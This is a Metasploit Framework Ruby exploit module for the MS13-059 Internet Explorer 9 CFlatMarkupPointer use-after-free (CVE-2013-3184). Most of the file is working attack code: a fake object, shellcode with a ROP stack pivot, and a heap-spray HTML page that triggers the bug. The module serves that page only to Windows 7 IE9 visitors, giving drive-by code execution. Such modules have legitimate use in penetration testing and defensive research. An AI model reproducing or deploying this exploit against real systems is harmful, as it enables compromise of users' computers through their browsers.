# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "MS13-059 Microsoft Internet Explorer CFlatMarkupPointer Use-After-Free",
      &#039;Description&#039;    => %q{
        This is a memory corruption bug found in Microsoft Internet Explorer. On IE 9,
        it seems to only affect certain releases of mshtml.dll. For example: This module
        can be used against version 9.0.8112.16446, but not for 9.0.8112.16421. IE 8
        requires a different way to trigger the vulnerability, but not currently covered
        by this module.

        The issue is specific to the browser&#039;s IE7 document compatibility, which can be
        defined in X-UA-Compatible, and the content editable mode must be enabled. An
        "onmove" event handler is also necessary to be able to trigger the bug, and the
        event will be run twice before the crash. The first time is due to the position
        change of the body element, which is also when a MSHTML!CFlatMarkupPointer::`vftable&#039;
        object is created during a "SelectAll" command, and this object will be used later
        on for the crash. The second onmove event seems to be triggered by a InsertButton
        (or Insert-whatever) command, which is also responsible for the free of object
        CFlatMarkupPointer during page rendering. The EnsureRecalcNotify() function will
        then still return an invalid reference to CFlatMarkupPointer (stored in EBX), and
        then passes this on to the next functions (GetLineInfo -> QIClassID).  When this
        reference arrives in function QIClassID, an access violation finally occurs when
        the function is trying to call QueryInterface() with the bad reference, and this
        results a crash. Successful control of the freed memory may leverage arbitrary code
        execution under the context of the user.

        Note: It is also possible to see a different object being freed and used, doesn&#039;t
        always have to be CFlatMarkupPointer.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;corelanc0d3r&#039;,  # Vuln discovery, PoC
          &#039;sinn3r&#039;         # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-3184&#039; ],
          [ &#039;OSVDB&#039;, &#039;96182&#039;   ],
          [ &#039;MSB&#039;, &#039;MS13-059&#039;  ],
          [ &#039;BID&#039;, &#039;61668&#039;     ],
          [ &#039;URL&#039;, &#039;http://zerodayinitiative.com/advisories/ZDI-13-194/&#039; ],
          [ &#039;URL&#039;, &#039;http://zerodayinitiative.com/advisories/ZDI-13-195/&#039; ]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # Vulnerable IE9 tested: 9.0.8112.16446
          [ &#039;Automatic&#039;, {} ],
          [ &#039;IE 9 on Windows 7 SP1 (mshtml 9.0.8112.16446)&#039;, {} ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;        => "\x00",
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jun 27 2013",
      &#039;DefaultTarget&#039;  => 0))
  end

  def rnd_dword
    rand_text_alpha(4).unpack("V").first
  end

  def get_fake_obj
    # edx,dword ptr [eax]
    # ...
    # call edx
    obj  = [0x20302020].pack("V*")  # EAX points to this (Target spray 0x20302020)
    obj << [rnd_dword].pack("V*")
    obj << [rnd_dword].pack("V*")
    obj << [rnd_dword].pack("V*")
    obj << [rnd_dword].pack("V*")

    return obj
  end

  # Target spray 0x20302020
  # ESI is our fake obj, with [esi]=0x20302020, [esi+4]=0x42424242, so on
  # eax=20302020 ebx=80004002 ecx=0250d890 edx=cccccccc esi=03909b68 edi=0250d8cc
  # eip=cccccccc esp=0250d87c ebp=0250d8a8 iopl=0         nv up ei ng nz na po cy
  # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010283
  # cccccccc ??              ???
  def get_payload
    code  = &#039;&#039;
    code << "\x81\xEC\xF0\xD8\xFF\xFF" # sub esp, -10000
    code << "\x61\x9d"                 # popad; popfd
    code << payload.encoded

    stack_pivot = [
      0x7c342643, # xchg eax, esp; pop edi; add [eax], al, pop ecx; ret
      0x0c0c0c0c
    ].pack("V*")

    p = generate_rop_payload(&#039;java&#039;, code, {&#039;pivot&#039;=>stack_pivot})

    return p
  end

  def is_win7_ie9?(agent)
    (agent =~ /MSIE 9/ and agent =~ /Windows NT 6\.1/)
  end

  # The meta-refresh seems very necessary to make the object overwrite more reliable.
  # Without it, it only gets about 50/50
  def get_html(cli, req)
    js_fake_obj = ::Rex::Text.to_unescape(get_fake_obj, ::Rex::Arch.endian(target.arch))
    js_payload  = ::Rex::Text.to_unescape(get_payload, ::Rex::Arch.endian(target.arch))

    html = %Q|
    <html>
    <meta http-equiv="X-UA-Compatible" content="IE=7"/>
    <meta http-equiv="refresh" content="2"/>
    <head>
    <script language=&#039;javascript&#039;>
    #{js_property_spray}

    var fake_obj = unescape("#{js_fake_obj}");
    var s = unescape("#{js_payload}");

    sprayHeap({shellcode:s});

    function setupPage() {
      document.body.style.position = &#039;absolute&#039;;
      document.body.contentEditable = &#039;true&#039;;
      document.body.style.right = &#039;1&#039;;
    }

    function hitMe() {
      document.execCommand(&#039;SelectAll&#039;);
      document.execCommand(&#039;InsertButton&#039;);
      sprayHeap({shellcode:fake_obj, heapBlockSize:0x10});
      document.body.innerHTML = &#039;#{Rex::Text.rand_text_alpha(1)}&#039;;
    }
    </script>
    </head>
    <body onload="setupPage()" onmove="hitMe()" />
    </html>
    |

    html.gsub(/^\t\t/, &#039;&#039;)
  end

  def on_request_uri(cli, request)
    if is_win7_ie9?(request.headers[&#039;User-Agent&#039;])
      print_status("Sending exploit...")
      send_response(cli, get_html(cli, request), {&#039;Content-Type&#039;=>&#039;text/html&#039;, &#039;Cache-Control&#039;=>&#039;no-cache&#039;})
    else
      print_error("Not a suitable target: #{request.headers[&#039;User-Agent&#039;]}")
      send_not_found(cli)
    end
  end
end

